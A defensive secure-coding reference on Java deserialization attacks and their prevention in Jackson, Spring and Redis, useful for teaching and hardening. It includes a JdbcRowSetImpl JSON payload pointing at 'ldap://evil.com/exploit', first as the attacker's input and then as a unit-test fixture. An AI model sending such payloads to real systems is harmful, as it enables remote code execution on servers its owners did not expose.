# Deserialization Attacks Reference

## Why This Matters in Java

Java's `ObjectInputStream` is one of the most exploited attack surfaces. Gadget chains (commons-collections, Spring, etc.) allow remote code execution from untrusted serialized data.

## Attack Vectors

### Native Java Serialization
```java
// VULNERABLE: Deserializing untrusted input
ObjectInputStream ois = new ObjectInputStream(userInputStream);
Object obj = ois.readObject(); // RCE if gadget chain exists on classpath
```

### Jackson Polymorphic Deserialization
```java
// VULNERABLE: Default typing enabled
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(); // NEVER DO THIS

// Attacker sends:
// {"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/exploit"}
```

### Spring-specific Vectors
- `@RequestBody` with polymorphic types and `@JsonTypeInfo`
- Spring HTTP invoker (uses Java serialization)
- RMI endpoints
- JMX over RMI

## Prevention

### Never Deserialize Untrusted Java Objects
```java
// If you MUST use ObjectInputStream, use allowlist filtering
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.dto.*;!*"  // Allow only your DTOs, deny everything else
);
ObjectInputStream ois = new ObjectInputStream(input);
ois.setObjectInputFilter(filter);
```

### Jackson Safe Configuration
```java
@Bean
public ObjectMapper objectMapper() {
    ObjectMapper mapper = new ObjectMapper();
    // NEVER enable default typing
    // If polymorphism needed, use explicit @JsonTypeInfo with allowlist
    mapper.deactivateDefaultTyping();
    return mapper;
}

// Safe polymorphism — explicit allowlist
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)
@JsonSubTypes({
    @JsonSubTypes.Type(value = Dog.class, name = "dog"),
    @JsonSubTypes.Type(value = Cat.class, name = "cat")
})
public abstract class Animal { }
```

### Spring Boot Hardening
```yaml
# Disable HTTP invoker (uses Java serialization)
# Don't expose RMI/JMX endpoints to network

# Use JSON, not Java serialization for:
spring:
  cache:
    redis:
      # Use JSON serializer, not JdkSerializationRedisSerializer
  session:
    # Use JSON serializer for session data
```

```java
// Redis: Use JSON serializer
@Bean
public RedisTemplate<String, Object> redisTemplate(RedisConnectionFactory factory) {
    RedisTemplate<String, Object> template = new RedisTemplate<>();
    template.setConnectionFactory(factory);
    template.setDefaultSerializer(new GenericJackson2JsonRedisSerializer());
    // NOT new JdkSerializationRedisSerializer() (default, dangerous)
    return template;
}
```

### Dependency Scanning
```bash
# Detect known gadget chain libraries
./gradlew dependencyCheckAnalyze

# Key libraries to watch:
# commons-collections < 3.2.2 / < 4.1
# commons-beanutils < 1.9.4
# Spring Framework (keep updated)
# Apache Commons IO, Xalan, etc.
```

## Testing
```java
@Test
void shouldRejectUnknownTypes() {
    String malicious = """
        {"@type":"com.sun.rowset.JdbcRowSetImpl",
         "dataSourceName":"ldap://evil.com/exploit"}
        """;

    assertThrows(JsonMappingException.class, () ->
        objectMapper.readValue(malicious, MyDto.class));
}
```

## Quick Reference

| Do | Don't |
|----|-------|
| Use JSON with typed DTOs | Enable `ObjectMapper.enableDefaultTyping()` |
| Allowlist `ObjectInputFilter` if Java serialization needed | Deserialize untrusted `ObjectInputStream` |
| JSON serializer for Redis/session | `JdkSerializationRedisSerializer` |
| Keep gadget-chain libraries updated | Ignore dependency vulnerability reports |
